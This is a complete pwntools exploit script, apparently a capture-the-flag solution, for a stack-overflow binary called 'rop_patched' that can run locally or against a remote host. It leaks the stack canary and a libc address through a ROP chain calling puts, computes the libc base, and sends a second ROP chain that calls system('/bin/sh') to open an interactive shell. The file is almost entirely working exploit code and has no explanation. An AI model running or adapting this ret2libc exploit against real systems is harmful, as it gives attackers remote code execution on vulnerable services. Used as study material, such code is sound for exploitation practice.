from pwn import *

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./rop_patched", )

elf = context.binary = ELF("./rop_patched", checksec=False)
rop = ROP(elf)
libc = ELF("./libc.so.6")
context.log_level = 'debug'

ret = 0x0000000000400596
pop_rdi = 0x0000000000400853

pause()

io.recvuntil(b'Buf: ')

payload1 = b'A'*(0x30+8)

io.sendline(payload1)

io.recv(0x30+8+6)

canary = u64(b'\x00' + io.recv(7))

# Print to verify
log.info(f"Leaked canary: {hex(canary)}")

payload2 = b'A'*(0x30+8)
payload2 += p64(canary)
payload2 += b'A'*8

payload2 += p64(pop_rdi)
payload2 += p64(elf.got['read'])
payload2 += p64(elf.plt['puts'])
payload2 += p64(elf.sym['main'])

io.sendline(payload2)

print(b"1: "+io.recvline())
print(b"2: " + io.recvline())
io.recvuntil(b'Buf: ')

leak = u64(io.recv(6).ljust(8,b'\x00'))
log.info(f"Leaked addr: {hex(leak)}")


# leak2 = u64(io.recv(6).ljust(8,b'\x00'))
# log.info(f"Leaked addr: {hex(leak2)}")

libc.address = leak - libc.sym['read']
log.info(f"libc_base: {hex(libc.address)}")

binsh = next(libc.search(b'/bin/sh'))

payload = b'A'*(0x30+8)
payload += p64(canary)
payload += b'A'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.sym['system'])

io.sendline(b'a')
io.sendline(payload)


io.interactive()
'''
0x7ffc0a2b8ea8

'''
